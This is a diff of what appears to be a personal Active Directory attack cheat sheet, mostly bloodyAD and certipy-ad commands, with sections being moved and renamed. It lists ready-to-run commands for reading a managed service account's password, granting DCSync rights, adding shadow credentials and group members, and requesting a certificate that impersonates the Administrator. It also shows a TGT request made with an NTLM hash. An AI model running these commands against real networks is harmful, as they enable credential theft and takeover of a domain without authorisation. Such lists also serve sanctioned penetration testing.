@@ -359,8 +359,13 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD
 +---------- Visualise LDAP ----------+
 godap $TARGET -d $DOM -t ldap/$DC -k
 
-+---------- Get Write Permissions ----------+
++---------- Computer and User Information ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
+
++---------- Get Commands ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object MGTSVC$ --attr msDS-ManagedPassword
 
 +---------- Add Commands ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'GROUP' 'USER'
@@ -372,10 +377,6 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
-
-+---------- LDAP Queries ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
 
 +---------- Check for Permissions ----------+
 adminCount
@@ -412,9 +413,7 @@ ValidatedSPN
 WriteDacl
 WriteOwner
 
-+---------- Get msDS-ManagedPassword ----------+
-bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
-
+[*] Active Directory: CS
 +---------- Get Certificate ----------+
 certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' req -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dynamic-endpoint
 certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' req -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'Administrator' -target $DC -key-size '4096'
